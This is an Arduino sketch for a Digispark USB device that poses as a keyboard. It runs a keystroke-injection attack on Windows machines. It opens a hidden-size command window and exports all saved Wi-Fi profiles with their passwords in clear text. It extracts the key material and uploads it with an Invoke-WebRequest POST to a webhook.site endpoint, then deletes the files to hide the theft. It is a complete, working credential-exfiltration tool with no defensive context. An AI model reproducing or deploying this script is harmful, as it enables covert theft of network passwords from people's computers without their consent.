// Converted using digiQuack by CedArctic (https://github.com/CedArctic/digiQuack) 

#include "DigiKeyboard.h"

void setup() {}

void loop() {
	DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("cmd /k mode con: cols=25 line=1");
	DigiKeyboard.delay(100);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1000);
	DigiKeyboard.print("cd %temp%");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.print("netsh wlan export profile key=clear");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.print("powershell Select-String -path wi-fi.xml -pattern 'keyMeterial' > Wifi-Key");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.print("powershell Invoke-WebRequest -Uri https://webhook.site/ac559705-9fed-4622-b9ca-b4ad2a33f1d5 -Method POST -InFile Wifi-Key");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.print("del wi* /s/f/q");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.print("exit");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
}